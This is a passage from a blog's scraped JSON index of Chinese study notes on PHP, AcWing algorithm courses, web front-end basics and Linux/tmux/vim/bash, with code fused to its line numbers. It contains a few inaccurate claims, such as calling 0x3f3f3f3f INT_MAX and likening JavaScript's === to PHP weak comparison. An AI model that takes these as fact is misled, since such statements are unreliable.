http://localhost/demo10_4/index.php 就相当于 localhost/demo10_4/a.rar 12.会话控制php脚本可以向客户端电脑中设置Cookie：setcookie ();在服务器端上超全局地读取Cookie的内容$_COOKIE删除Cookie:setcookie(&quot;member&quot;,'',time()-1);uniqid(random)session1234567session_start(); 1)开启一个会话 一个客户 到超市里面买东西 办会员卡！ 2)打开已经存在的会话 当这个客户 以后再到超市买东西的时候 根据上次办的卡号 买东西！ 根据客户端传来的session id 把这个 session id 对应的数据 读取到 $_SESSION这个变量里面 三、bbs开发1.需求分析能够让浏览我们网站的用户可以看其他用户发的帖子，注册成为我们网站的会员之后，还可以回复帖子父版块：比较大的分类 子版块：在父版块内再分类 版主：就是某个子版块的版主,具有删除本分类下面的帖子、回复的权限 2.前台和后台界面(html,css,js)3.数据库设计phpmyadmin创建数据库-&gt;整理utf8父板块信息：id(索引：primary),module_name,sort文件结构： 1234admin/:存放后台程序文件inc/:存放被包含的文件(比如自己定义的函数库)static/:存放样式、图片uploads:存放上传文件 php与数据库交互(端口是3306)在mysql中，可通过关键字auto_increment为列设置自增属性，只有整型列才能设置此属性，每个表只能定义一个auto_increment列，并且必须在该列上定义主键约束（primary key）(一张表只能有一个主键，用来和其他表互动的)如果输入的数据库语句中有引号等，必须转义后再执行 父板块展示与删除其实就是循环输出html语句 操作确认发现传过去confirm.php的url会有双问号，方法是urlencode 编写系统引导程序迁移到不同服务器：1.建立好程序需要使用的数据库以及表,以及对应的数据2.修改config.inc.php配置文件","link":"/2022/05/22/PHP%E5%AD%A6%E4%B9%A0/"},{"title":"acwing 2.数据结构","text":"摘要：acwing算法基础课学习笔记 前言cin和scanf一样快的方法:ios::sync_with_stdio(false); 一、数据结构1.链表(1)单链表1234567891011121314151617181920212223// head存储链表头，e[]存储节点的值，ne[]存储节点的next指针，idx表示数组的存储当前已经用到了哪个节点int head, e[N], ne[N], idx;// 初始化void init(){ head = -1; idx = 0;}// 在链表头插入一个数avoid insert(int a){ e[idx] = a; ne[idx] = head;//上一个head等于的idx,必须是这个顺序 head = idx ++ ;}// 将头结点删除，需要保证头结点存在void remove(){ head = ne[head];} 无法释放空间，因为用了idx++。算法题绝对不要考虑内存泄漏的问题 单链表可以用O(1)的时间找到下一个点的位置，但是找不到上一个点的位置，只往后看不往前看 (2)双链表12易错点：此时第k个插入的数idx=k+1别忘记初始化r[0]和l[1],以及main函数里要调用 2.栈和队列中缀表达式：（1）双栈，一个操作数栈，一个运算符栈；（2）运算符优先级，栈顶运算符，和，即将入栈的运算符的优先级比较：如果栈顶的运算符优先级低，新运算符直接入栈如果栈顶的运算符优先级高，先出栈计算，新运算符再入栈 这个方法的时间复杂度为O(n)，因为整个字符串只需要扫描一遍。运算符有+-*/()~^&amp;都没问题 3.单调栈123456789101112131415161718#include&lt;iostream&gt;using namespace std;const int N = 1e5+10;int tt,stk[N];int main(){ ios::sync_with_stdio(false); int n; cin&gt;&gt;n; for(int i=0;i&lt;n;i++){//每个元素最多只会进栈一次，出栈一次，所以时间复杂度O(n) int x; cin&gt;&gt;x; while(tt&amp;&amp;stk[tt]&gt;=x)tt--; if(tt)cout&lt;&lt;stk[tt]&lt;&lt;&quot; &quot;; else cout&lt;&lt;-1&lt;&lt;&quot; &quot;; stk[++tt]=x; } return 0;} 4.滑动窗口别忘了做完一遍要重新初始化hh和tt 12while(hh&lt;=tt&amp;&amp;q[hh]&lt;i-k+1)hh++;//用while比用if好，否则k=1时会出问题while(hh&lt;=tt&amp;&amp;a[q[tt]]&gt;=a[i])tt--; 5.KMP求Next数组 6.trie 字符串仅包含小写英文字母，即每个节点最多只能延伸26条边 son[N][26],cnt[N],n表示每个节点的下标，根节点和NULL都为0 最大异或数：从高位开始考虑，往和当前数字不同的分支走(只有一个分支除外) 只需枚举$C_n^2$种情况，ai,aj和aj,ai是一样的，所以可以边做边插入,不需要全部插入再做。注意若输入的数&lt;2^31,总的0和1个数为输入的数的数量*31 7.并查集 核心代码： 1234int find(int x){ if(p[x]!=x)p[x]=find(p[x]); return p[x];} 进一步优化(路径压缩)：减少树的高度到只有两层-&gt;只搜一遍，把经过的所有节点全部指向根节点(代表元素)(接近O(1)) 变体：维护额外数据(如集合大小)初始si[i]=1,只保证根节点的size是有意义的。 123注意:数组名不能用size先变维护的数组(如si),再变p;或者用a_root和b_root分别存储find(a)和find(b) 如果a和b已经在一个集合里了，就不进行操作 食物链： 初始化：每个点都是自己集合的根节点，即距离初始化为0 路径压缩仍可用，每次更新把到父节点的距离相加即可 8.堆完全二叉树：最后一层节点从左到右依次排布小根堆：每个点都是以这个点为根的所有点的最小值建堆：O(n) 变体：第k个插入的数，额外维护ph[k]=j(第k个插入的数在堆中的下标是j),hp[j]=k(堆中下标为j的点对应的是第k个插入的数) 注意：输入ph[k]要用idx保存起来，因为交换时ph[k]会改变难点：交换映射(双射) 9.哈希表拉链法 注意：取模的数要是质数，而且要离2的整次幂尽可能远 一般只有插入和查询，删除即查找的一种，即在找到的数上打一个标记 开放寻址法开数据大小的2-3倍数组 核心是find(int x),如果x在hash中已存在，则返回其在哈希表中的位置,否则返回其应该存储的位置。注意如果到了数组末尾要循环回到0 memset是按字节赋值的，如memset(h,-1,sizeof h)表示每一个字节的每一位bit都是1,整个就是-1。或者INT_MAX=0x3f3f3f3f 字符串哈希(解决字符串的利器)快速判断两个字符串是否相等 核心思想:用P进制的角度把字符串转换成数字 h[i]=字符串前i个字符的哈希值 h[0]=0 图上应为$h[R]-h[L-1]*P^{R-L+1}$哈希值是$[0,2^{64}-1]$的数。 注意，字符串的位置从 1 开始编号。 10.STL 所有容器都有两函数，时间复杂度为O(1) 申请空间时，系统的处理时间与空间大小无关，与申请次数有关 vector的比较操作：字典序比较，从高位比较起 定义小根堆的技巧： priority_queue&lt;int,vector&lt;int&gt;,greater&lt;int&gt;&gt; heap 123set//没有重复元素 o(logn)multimap中的key可以重复，所以multimap中没有重载operator[ ]功能。对于重复的元素，查找的时候也是返回中序遍历的第一个元素bitset//大矩阵 MLE 总结参考资料1.acwing","link":"/2022/04/14/acwing%202.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"title":"acwing 3.搜索图论","text":"摘要：acwing算法基础课学习笔记 一、DFS n皇后：每行只能放一个皇后，即每行都有一个皇后 二、BFS走迷宫： 三、树与图的深度优先遍历 邻接表存储的次序无关紧要，头插法 树的重心：(无向无环图)，重心连了n个点，删掉重心后，n个点分别形成1个连通块 四、树与图的广度优先遍历 五、拓扑排序有向无环图才有且一定有拓扑序列，所以有向无环图被称为拓扑图(自环也不行) 准确定义：若一个由图中所有点构成的序列 A 满足：对于图中的每条边 (x,y)，x 在 A 中都出现在 y 之前，则称 A 是该图的一个拓扑序列。 自环：有边(x,x)，但x在A中并不出现在x之前 一个有向无环图，一定至少存在一个入度为0的点(反证法) 为什么删掉t到j的边？因为t先入队已经发生了，删不删j都在t后面入队 六、Dijkstra 朴素dijkstra(稠密图) dijkstra:贪心(稠密图用邻接矩阵存，稀疏图用邻接表存)其余:动态规划 无向图是一种特殊的双向有向图 自环:只需初始化dist[1]=0，可无视。重边:只保留距离最短的那条边 堆优化dijkstra(稀疏图) 七、bellman-ford第k次迭代：最短路不超过k条边若第n次迭代有更新：最短路为n条边-&gt;n+1个点-&gt;有两个点相同-&gt;存在负环(更新了)(找负环)一般前k次迭代d[a]=$\\infin$,k+1次才更新如果限制了最短路经过的边数，有负权回路也无所谓更新过程中可能发生串联，解决方法：更新过程中只用上一次的结果(backup数组，memcpy) 八、spfaspfa求最短路要求没有负权回路(一般最短路都没有)bf算法中只有a变小了b才会变小queue里存的是每次更新后到起点距离变小的点，入队时要判断一下如果队列已经有b就不用重复入队(但值还是会更新成更小值)基本思想：我更新过谁才能再拿谁来更新别人，一个点如果没被更新过的话，直接拿它来更新别人一定是没有效果的(重复的)，只有我变小了我后面的才会变小网格状的最短路通常会被卡成O(nm) spfa求负环思路与bf算法一样，都是抽屉原理，证明存在环经过i-&gt;i点后，1到t的总路径变小了，所以是负环，否则环不会存在。(因为存的是最短路径，否则在dist[i]+w时不会更新成有环的路)此时初始化时不能只入队1,因为有负环的路不一定起点是1，要把所有点都放入队 九、Floyd可以有负边，不能有负环 d[N][N]为邻接矩阵重边和自环：d[a][b] = min(d[a][b],w); 十、prim朴素prim由 V 中的全部 n 个顶点和 E 中 n?1 条边构成的无向连通子图被称为 G 的一棵生成树，其中边的权值之和最小的生成树被称为无向图 G 的最小生成树。dijkstra的dist表示的是点到1号点的最小距离，prim的dist表示的是点的集合的最小距离 堆优化(不会用到) 十一、Kruskal贪心思想：从小到大枚举每条边，如果后来的边已经有比它小的边在集合里了就不加入第二步实现：并查集如果加到集合的边数&lt;n-1，则说明其不连通 十二、染色法判定二分图 十三、匈牙利算法可以得出成功匹配的最大数量st的作用：st[e[i]] = 1;一方面防止find(match[e[i]])又匹配到了e[i]，另一方面如果这次匹配失败，说明match[e[i]]不能改动，之后递归过程中其他男生准备换女生的时候不用尝试e[i]了 总结参考资料1.acwing","link":"/2022/04/14/acwing%203.%E6%90%9C%E7%B4%A2%E5%9B%BE%E8%AE%BA/"},{"title":"acwing 4.数学知识","text":"摘要：acwing算法基础课学习笔记 一、数论质数判定 分解质因数 筛质数先从小到大把每个数的倍数筛掉，剩下的就是质数证明：如果p没被筛掉，说明2~p-1均不是p的约数优化：埃氏筛法–可以只把质数的倍数筛掉(p可以分解质因数)优化：线性筛法(数量大时快一倍)当i枚举到x之前一定会先枚举到x/i，此时会通过st[prime[j]*i]把x=prime[j]*i预先筛掉。已经找到了最小质因子就可以提前break掉 二、组合计数三、高斯消元四、简单博弈论 总结参考资料1.acwing","link":"/2022/04/14/acwing%204.%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86/"},{"title":"acwing 5.动态规划","text":"摘要：acwing算法基础课学习笔记 一、背包问题01背包$f[i][j]=max(f[i-1][j],f[i-1][j-v[i]]+w[i])$ 完全背包朴素做法：比较耗时O(nV^2)优化：O(nV),也可以用滚动数组(j从小到大时f[j-v[i]]实际上是f[i][j-v[i]],因为比较小的j先更新了) 多重背包第 i 种物品最多有 si 件，每件体积是 vi，价值是 wi。朴素方法：和完全背包问题一样，只是k改成了si且kv[i]&lt;=j二进制优化：因max没有减法，不能直接用完全背包的优化思路：用10个新的物品来表示原来的物品-&gt;01背包复杂度：O(nVlogs)实现：在输入数据时就直接拆分物品-&gt;01背包，注意新的物品总个数N=n(logs+1) 分组背包每组物品有若干个，同一组内的物品最多只能选一个。每件物品的体积是 vij，价值是 wij，其中 i 是组号，j 是组内编号。不能用滚动数组了 二、线性dp如背包问题是二维状态，以i,j为二维坐标，发现状态的更新是一行一行地做的，即线性dp 数字三角形注意初始化时的边界问题(j要从0到i+1)从终点出发会更简单，不用考虑边界问题，最后直接输出f[1][1] 最长上升子序列状态表示几维原则：一定要能让答案表示出来，维数越小越好集合里的区间不一定合法，需满足倒数第二个数a[j]&lt;a[i]。f[i] = max(f[j] + 1);(j满足0~i-1,且a[j]&lt;a[i])时间复杂度=状态数*计算每个状态的时间求方案(子序列是什么)：把转移记录下来 最长公共子序列一般涉及到两个字符串都可以用(i,j)表示第一个字符串的前i个和第二个字符串的前j个01∈f[i-1,j]∈f[i,j]，用f[i-1,j]代表01会有重复元素，但求max允许重复的存在，但求子序列数量的话就不行。因为f[i-1][j-1]∈f[i-1][j]+f[i][j-1]所以通常不写第一项优化：二分法 最短编辑距离 三、区间dp石子合并以最后一次合并的分界线来分类(左边一堆，右边一堆)先删除最后一步的合并，再加上。最后一步的合并代价即为i到j的质量总和(可用前缀和s[j]-s[i-1]表达出来)状态计算时遍历k的值为i到j-1，因为右边至少要有一堆 四、计数类dp属性不再是最值，而是数量 整数划分方法一：完全背包变体容量为0时，前 i-1 个物品全不选也是一种方案，即j恰好等于k*i时，前i-1都不选，只选k个i，也是一种方案方法二：每个数需要一直被拆解到1整个过程才能结束 五、数位统计DP前缀和思想：对1-9是正确的：对0：注意(abc-1)*power(i),因前导0会把0全部去掉 六、状态压缩DP蒙德里安的梦想当我们把横向小方格摆好后，竖向小方格就只有一种摆法(即顺次摆1种方案)，所以整个方案数=摆横向小方格的方案数 最短哈密顿路径k是所有与j相邻的点$i=(01110101)_2$表示经过第02456个点,f[i][j]表示从0走到j，经过的所有点是i(也包括0，j),所以f[1][0]=0(表示从点0走到0,经过了点0所以i=1) 七、树形DP 八、记忆化搜索记忆化：每个状态只计算一次，不重复计算-1表示每个状态还没有计算出来 总结参考资料1.acwing","link":"/2022/04/14/acwing%205.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"title":"acwing 6.贪心","text":"摘要：acwing算法基础课学习笔记 一、区间问题区间选点只有问题是单峰的才能用贪心，即必须是全局最优解而不是局部最优解排序：左端点，右端点，双关键字排序证明：首先，这样取出来的点一定能保证所有区间都有一个点，即为一个合法方案CNT，最优解ANS是所有合法方案的最小，即ANS&lt;=CNT接下来证明ANS&gt;=CNT即可，只把“否则”内的区间列出来，下一个选择点的区间一定和上一个没有任何交集，由于是按照右端点从小到大枚举，所以下一个区间一定在上一个的右边。现在每两个区间是没有任何交集的，一共找出了有CNT个没有任何交集的区间。现在我们想选点ANS来覆盖这些区间，每选一个点只能覆盖一个区间，所以ANS&gt;=CNT 最大不相交区间数量 区间分组如果存在这样的组，随便挑一个放进去证明：这CNT组一定存在一个公共点Li，所以一定有至少CNT组，即ANS&gt;=CNT 区间覆盖 给定 N 个闭区间 [ai,bi] 以及一个线段区间 [s,t]，请你选择尽量少的区间，将指定线段区间完全覆盖 因为cnt的右端更大，如果ans里的某个区间不一样，则一定可以被替换成cnt里的区间 二、Huffman树合并果子每次可以随意合并两堆huffman_tree:数越小的一定深度越深且可以互为兄弟(越深相加得次数越多) 三、排序不等式短作业优先调度(交换调整法证明) 四、绝对值不等式 五、推公式因为s[i]&lt;wi+si,w(i+1)+s(i+1)&lt;wi+si,所以交换之后的风险值的最大值一定小于交换前的风险值的最大值 六、时间复杂度","link":"/2022/04/14/acwing%206.%E8%B4%AA%E5%BF%83/"},{"title":"acwing web应用课","text":"摘要：acwing web应用课学习笔记 一、安装与依赖vscode插件：Live Server(一般网站都是部署在linux服务器上，linux会有服务来承载我们的网站，可以帮我们模拟一个网站的后端服务器，本地搭建网站-&gt;open with live server)auto rename tag(修改标签头时可以自动修改尾)保存时自动对齐格式化:设置-&gt;搜索format on save 技巧：ctrl+/ 注释掉光标所在的行，再按一下就是取消注释 MDN WEB DOCS二、html1.html文件结构有些标签是没有结束标签的，如metabody是承载网站内容的地方第一行写文件类型快速补全:不用打括号，直接tab括号里的内容(更简便的是直接输一个！) 2.文本标签绝大部分标签都是div和span扩展出来的，只是用了不同的CSS样式div是一个块，把内容归到一起，方便css和js操作,默认换行 1其他块级标签例如：&lt;h1&gt;, &lt;p&gt;, &lt;pre&gt;, &lt;ul&gt;, &lt;ol&gt;, &lt;table&gt; span是行内元素，默认不带回车 12其他内联标签例如：&lt;i&gt;, &lt;b&gt;, &lt;del&gt;, &lt;ins&gt;, &lt;td&gt;, &lt;a&gt;&lt;img&gt; &amp;nbsp是空格 br是回车hr是加一条水平线 3.表单form标签表示文档中的一个区域，此区域包含交互控件，用于向 Web 服务器提交信息。form内的button会把form的所有内容都提交 三、css1.样式定义方式2.选择器3.颜色4.文本5.字体6.背景7.边框8.元素展示格式9.内边距与外边距10.盒子模型12.浮动13.flex布局14.响应式布局四、js(ES6标准)使用方式HTML页面中的任意位置加上&lt;script type=&quot;module&quot;&gt;&lt;/script&gt;标签即可。常见使用方式有： 123直接在&lt;script type=&quot;module&quot;&gt;&lt;/script&gt;标签内写JS代码。直接引入文件：&lt;script type=&quot;module&quot; src=&quot;/static/js/index.js&quot;&gt;&lt;/script&gt;。将所需的代码通过import关键字引入到当前作用域。 123456&lt;script type=&quot;module&quot;&gt;//严格限制变量作用域 import { name, print } from &quot;/static/js/index.js&quot;; console.log(name); print();&lt;/script&gt; CSS控制HTMLJavaScript控制HTML与CSS执行顺序：和渲染html页面一样，从上到下依次执行 1.输入与输出===和！==和php的弱类型比较一样和前端的交互：一般把script放下面，为了防止执行脚本的时候页面内容还没有渲染出来(从上到下执行)input是一个标签标签.addEventListener(事件，触发事件时执行的函数)作用是给某个标签绑定一个函数从终端(标准输入)获取输入：js文件的export提供接口 2.类函数里可以用add.prototype来定义类(ES6里有了class后就不用了)实际在前端中，每个class往往对应一个组件，复杂的组件里还可以有多个class作为成员，比如页面类里有多个按钮类作为成员定义类的成员变量时不仅可在构造函数定义，还可在任意函数中定义继承用extends 父类子类的构造函数一定要先用super调用父类构造函数，再定义自己的成员变量在其他函数调用的super是指向父类的实例子类的函数会把父类的覆盖掉(多态) 静态成员(直接在前面加static)构造类的实例时是没有初始化静态成员的，也不能调用要通过类名去调用(只有这一种方法)静态函数或静态变量是和类相关的，与实例无关，即并不是实例的成员一旦静态成员改变了，对所有实例来说都改变了应用：this.id = ++Point.cnt;当静态变量较多，就可以写专门的静态函数来操作这些变量静态成员可以被继承 3.事件(js和页面产生交互)JavaScript的代码一般通过事件触发。可以通过addEventListener函数为元素绑定事件的触发函数。常见的触发函数有： 12345678910111213141516171819202122232425262728293031鼠标click：鼠标左键点击dblclick：鼠标左键双击contextmenu：鼠标右键点击mousedown：鼠标按下，包括左键、滚轮、右键 event.button：0表示左键，1表示中键，2表示右键mouseup：鼠标弹起，包括左键、滚轮、右键 event.button：0表示左键，1表示中键，2表示右键键盘keydown：某个键是否被按住，事件会连续触发 = mousedown event.code：返回按的是哪个键 event.altKey、event.ctrlKey、event.shiftKey分别表示是否同时按下了alt、ctrl、shift键。keyup：某个按键是否被释放 = mouseup event常用属性同上keypress：紧跟在keydown事件后触发，只有按下字符键时触发。适用于判定用户输入的字符。 = click event常用属性同上keydown、keyup、keypress的关系类似于鼠标的mousedown、mouseup、click表单focus：聚焦某个元素blur：取消聚焦某个元素change：某个元素的内容发生了改变(只有取消聚焦时才会识别是否改变)窗口(浏览器)需要作用到window元素上。resize：当窗口大小放生变化scroll：滚动指定的元素load：当元素被加载完成调试event.type //可返回触发的事件类型,如click 4.常用库12345678910jQuery(ajax) -获取DOM元素(比原始写法代码更短)setTimeout与setIntervalrequestAnimationFrameMap与SetlocalStorageJSON日期WebSocketwindowcanvas jQuery一般变量前会有$选择器的语法和css一样事件：元素.on(‘click’,function(){})也可以直接$div.click(function(){})解绑定(如希望只点击一次)用.off(‘click’),注意写在on函数里可以绑定多个函数(依次执行)如何解绑部分函数：可以给事件提供一个名称，如click.name1，然后解绑对应事件 123在事件触发的函数中的return false等价于同时执行：function(e)e.stopPropagation()：阻止事件向上传递e.preventDefault()：阻止事件的默认行为 事件向上传递： 12345678910111213let $div = $('div');let $a = $('div &gt; a')let main = function () { $div.on('click', function () { console.log('haha'); }) $a.on('click', function (e) {//点a会输出a,haha console.log('a'); //e.stopPropagation();//只输出a //e.preventDefault();//输出a,haha,但无法打开超链接 //return false//等价于写了上面两函数,即只输出a，无法打开 })} 元素的隐藏与展现元素的添加与删除:$(标签的完整写法) –动态添加append是尾插，prepend是头插 12$A.remove()：删除元素$A$A.empty()：清空元素$A的所有儿子 类的添加与删除(如点击改变颜色)操作css 1234567891011$div.on('click', function () { console.log($div.css('background')); $div.css('background', 'blue');})$div.on('click', function () { console.log($div.css('background-color')); $div.css({ 'width': '20px', 'background-color': 'blue' });}) 对元素属性的操作： 12$('div').attr('id')：获取属性$('div').attr('id', 'ID')：设置属性 对元素内容的操作： 123$A.html()：获取、修改HTML内容$A.text()：获取、修改文本信息$A.val()：获取、修改文本的值 //一般用在input或textarea里 查找某个元素： 1234$(selector).parent(filter)：查找父元素//length为0表示查不出来$(selector).parents(filter)：查找所有祖先元素$(selector).children(filter)：在所有子元素中查找$(selector).find(filter)：在所有后代元素中查找 ajax用来和后端通信ajax即一般的http协议，只能由客户端向服务器发送请求，然后服务器返回响应，服务器无法主动向客户端发送请求GET方法： 12345678910$.ajax({ url: url,//后端链接 type: &quot;GET&quot;, data: { }, dataType: &quot;json&quot;,//返回内容的类型 success: function (resp) {//如果没报错，从后端获取信息后就会调用函数，resp为后端返回的信息 },}); 在不刷新页面的前提下只从服务器端获取某些数据(一般是json)POST方法： 12345678910$.ajax({ url: url, type: &quot;POST&quot;,//唯一区别 表单 data: {//往后端传的参数 }, dataType: &quot;json&quot;, success: function (resp) { },}); 延时执行函数12345678910setTimeout(func, delay) //delay毫秒后，执行函数func()。clearTimeout() //关闭定时器let timeout_id = setTimeout(() =&gt; { console.log(&quot;Hello World!&quot;)}, 2000); // 2秒后在控制台输出&quot;Hello World&quot;clearTimeout(timeout_id); // 清除定时器setInterval(func, delay) //每隔delay毫秒，执行一次函数func()。第一次在第delay毫秒后执行。clearInterval() //关闭周期执行的函数 requestAnimationFrame页面刷新之前执行一次，通常用递归写法，使其每秒执行60次func函数，用于做动画或游戏 12345let step = () =&gt; { requestAnimationFrame(step);//刷新时执行函数 $div.width($div.width() + 1);//元素变了，页面就要刷新一下}requestAnimationFrame(step);//执行一次 如果执行时切换到其他页面它会暂停，原因是每一帧渲染前才会执行一次，如果页面切换了，浏览器就不会再渲染它setTmeout两次调用之间的间隔包含回调函数的执行时间(有可能恰好在一个帧开头，就得等到下一帧才能执行，函数执行时间长时效果就会忽快忽慢)；setInterval只能保证按固定时间间隔将回调函数压入栈中，但具体的执行时间间隔仍然受回调函数的执行时间影响。当页面在后台时，因为页面不再渲染，因此requestAnimationFrame不再执行。但setTimeout与setInterval函数会继续执行。 map和set可看做一个定义好的类 localStorage可以在用户的浏览器上存储键值对。一般刷新就消失了，要想让其不消失不用重新从服务器获取，就存到用户的浏览器里，类似cookie、用户偏好、浏览器缓存 12345常用API：localStorage.setItem(key, value)：插入localStorage.getItem(key)：查找localStorage.removeItem(key)：删除localStorage.clear()：清空 JSONJSON对象用于序列化对象、数组、数值、字符串、布尔值和null。因为很多函数(如websocket)的参数只能传字符串，需要把数组、map、函数之类的转化成字符串传进去，再解析成原来的类型常用API： 12JSON.parse()：将字符串解析成对象JSON.stringify()：将对象转化为字符串 日期12345678910111213141516返回值为整数的API，数值为1970-1-1 00:00:00 UTC（世界标准时间）到某个时刻所经过的毫秒数：Date.now()：返回现在时刻。Date.parse(&quot;2022-04-15T15:30:00.000+08:00&quot;)：返回北京时间2022年4月15日 15:30:00的时刻。与Date对象的实例相关的API：new Date()：返回现在时刻。new Date(&quot;2022-04-15T15:30:00.000+08:00&quot;)：返回北京时间2022年4月15日 15:30:00的时刻。两个Date对象实例的差值为毫秒数getDay()：返回星期，0表示星期日，1-6表示星期一至星期六getDate()：返回日，数值为1-31getMonth()：返回月，数值为0-11getFullYear()：返回年份getHours()：返回小时getMinutes()：返回分钟getSeconds()：返回秒getMilliseconds()：返回毫秒 WebSocket有些情况需要后端向前端发送请求，比如聊天室提醒有消息，http协议无法满足(但也可以用轮询的方法，如每隔10s问一下后端有没有信息)，于是有了websocket协议，两边都可主动发起通信与服务器建立全双工连接。常用API： 123456new WebSocket('ws://localhost:8080');//建立ws连接。注意不是http协议而是ws协议 类似https有wsssend()：//向服务器端发送一个字符串。一般用JSON将传入的对象序列化为字符串。onopen：//类似于onclick，当连接建立时触发。onmessage：//当从服务器端接收到消息时触发。close()：//关闭连接。onclose：//当连接成功关闭后触发。 window123window.open(&quot;https://www.acwing.com&quot;)//在新标签栏中打开页面。(window.)location.reload()//刷新页面。window可不写(window.)location.href = &quot;https://www.acwing.com&quot;//在当前标签栏中打开页面。 Canvas可以使用js脚本在浏览器做动画或游戏canvas的所有操作都是通过ctx(canvas[0].getContext(‘2d’)) 五、中期项目：拳皇动画基础：1秒24张图片物体的移动templates放html三个元素：地图和两个玩家，都要每秒刷新60次(game_object)前端坐标系聚焦才能让键盘输入字符，键盘的字符要输入的地方就是我们聚焦的地方(比如选择某个框输入文字)如何判定角色能否攻击到对方：二维矩形，三维圆柱或球来代表元素要区分不同状态-&gt;状态机渲染gif的每一帧，容易控制速度utils文件夹存辅助函数注意多个函数里的this不再是类的this偏移量可防止因为不同的图片人物到水平线以下如何判定有没有攻击到对方：(碰撞检测)两个图形是否有交集 一些不变的功能(如血条、计时器)不要在canvas里渲染，因为它1s会渲染60次，比较耗费资源 总结参考资料1.acwing","link":"/2022/04/14/acwing%20Web%E5%BA%94%E7%94%A8%E8%AF%BE/"},{"title":"acwing linux","text":"摘要：acwing linux课学习笔记 一、常用文件管理命令linux学的是把后端的框架、数据库搭好后，前端就可以调用后端的函数了 1string f(string url){return &quot;html&quot;;} 1.terminal是什么两个屏幕(命令行)共用一个主机多个电脑又可以连到一个或多个服务器，服务器一般不会关机acterminal其实是acwing服务器的终端，可以连接到其他服务器一般工作时不会用自己的电脑，而是用服务器提供的接口来操作服务器，只要有一个终端就可以了命令行的好处:有很多批量化操作 2.文件系统123456789根目录：/bin:常用的可执行文件的命令etc:配置,如部署网站里面会有apache、nginx等的配置文件var:里面有个log文件夹存日志lib:保存一些安装包和头文件home:所有用户的家目录(工作目录)的集合 有用户1，用户2...文件夹proc:进程相关的信息(计算机的信息，如cat /proc/cpuinfo)root:根用户的目录当前用户：~(登录后的默认目录) 3.路径12345绝对路径:从根目录开始描述相对路径：从当前目录开始描述 tmp/main.cpp(开头无/).. ：上层目录. ：当前目录访问家目录的tmp文件夹: cd ~/tmp 4.常用命令介绍123456789101112131415161718192021222324252627(1) ctrl c: 取消命令，并且换行(2)clear(3) tab键：如果补全不了快速按两下tab键，可以显示备选选项(4) ls: list，蓝色的是文件夹，白色的是普通文件，绿色的是可执行文件ls -l:显示文件长信息(包括权限)d表示文件夹 -表示普通文件 x是可执行ls -h 人性化输出ls -a 输出all隐藏文件(以.开头的文件)参数位置可以随便变 如ls -ah 和 ls -ha是一样的(5)cd 默认家目录 cd - 返回上一个待过的目录(只能一个)(6) pwd: 显示当前路径(7) cp XXX YYY: 将XXX文件复制成YYY，XXX和YYY可以是一个路径，比如../dir_c/a.txt，表示上层目录下的dir_c文件夹下的文件a.txt(也可以重命名)复制+粘贴+重命名(8) mkdir XXX: 创建目录XXX创建a里有b，b里有c；mkdir a/b/c -p(9) rm XXX: 删除普通文件; rm XXX -r: 删除文件夹(递归) rm * ：删除所有名字有空格用转义字符即可y\\ c支持正则表达式：rm *.txt(10) mv XXX YYY: 将XXX文件移动到YYY，和cp命令一样，XXX和YYY可以是一个路径或文件；重命名也是用这个命令剪切+粘贴+重命名(11) touch XXX: 创建一个文件(12) cat XXX: 展示文件XXX中的内容(13) 复制文本 windows/Linux下：Ctrl + insert，Mac下：command + c(14) 粘贴文本 windows/Linux下：Shift + insert，Mac下：command + v(15)man 和-h同样作用 二、编辑环境：tmux和vim1.tmux功能： (1) 分屏。 (2) 允许断开Terminal连接后，继续运行进程。结构： 一个tmux可以包含多个session，一个session可以包含多个window，一个window可以包含多个pane。 top：任务管理器 12345678910111213141516(1) tmux：新建一个session，其中包含一个window，window中包含一个pane，pane里打开了一个shell对话框。(2) 按下Ctrl + a后手指松开，然后按%：将当前pane左右平分成两个pane。(3) 按下Ctrl + a后手指松开，然后按&quot;（注意是双引号&quot;）：将当前pane上下平分成两个pane。(4) Ctrl + d：关闭当前pane；如果当前window的所有pane均已关闭，则自动关闭window；如果当前session的所有window均已关闭，则自动关闭session。(9) 按下ctrl + a后手指松开，然后按z：将当前pane全屏/取消全屏。(10) 按下ctrl + a后手指松开，然后按d：挂起当前session。(11) tmux a：打开之前挂起的session。 attach(12) 按下ctrl + a后手指松开，然后按s：选择其它session。 方向键 —— 上：选择上一项 session/window/pane 方向键 —— 下：选择下一项 session/window/pane 方向键 —— 右：展开当前项 session/window 方向键 —— 左：闭合当前项 session/window(18) tmux中复制/粘贴文本的通用方式： (1) 按下Ctrl + a后松开手指，然后按[ (2) 用鼠标选中文本，被选中的文本会被自动复制到tmux的剪贴板 (3) 按下Ctrl + a后松开手指，然后按]，会将剪贴板中的内容粘贴到光标处 2.vim在tmux里vim支持鼠标(注意大小写) 123456789G:跳转行(gg是跳转头，G跳转最后行)\\d+空格:跳转该行的第几个字符d:删除(剪切)模式(dd删除整行)u:撤销(ctrl+r取消撤销)y:复制(yy复制整行)p:粘贴=:格式化&gt;:向右缩进&lt;:向左缩进 12345/查找内容+回车 n查找下一个 N查找上一个:set nonu(无num，即无行号):noh(无highlight):行号,行号(或1,$)s/w1/w2/g:行号,行号s/w1/w2/gc 每次询问 三.shell语言Linux中常见的shell脚本有很多种，常见的有： 12345Bourne Shell(/usr/bin/sh或/bin/sh)Bourne Again Shell(/bin/bash)C Shell(/usr/bin/csh)K Shell(/usr/bin/ksh)zsh Linux系统中一般默认使用bash，所以接下来讲解bash中的语法。文件开头需要写#! /bin/bash，指明bash为脚本解释器。 12chmod +x test.sh # 使脚本具有可执行权限bash test.sh # 用解释器执行 不需要 x权限 1.变量一般定义的变量都是字符串,=两边不能有空格 123name1='yxc' # 单引号定义字符串name2=&quot;yxc&quot; # 双引号定义字符串name3=yxc # 也可以不加引号，同样表示字符串 使用变量，需要加上$符号，或者${}符号。花括号是可选的，主要为了帮助解释器识别变量边界。 1234echo $name # 输出yxcecho ${name} # 输出yxcecho ${name}acwing # 输出yxcacwingecho ${name1}${name2} # 输出yxcacwing 使用readonly或者declare可以将变量变为只读。 12readonly namedeclare -r name # 两种写法均可 unset可以删除变量。 123name=yxcunset nameecho $name # 输出空行 进程与环境变量bash开一个子进程 1234自定义变量（局部变量）：子进程不能访问的变量环境变量（全局变量）：子进程可以访问的变量自定义变量改成环境变量：export name # 第一种方法 declare -x name # 第二种方法环境变量改为自定义变量：export name=yxc # 定义环境变量 declare +x name # 改为自定义变量 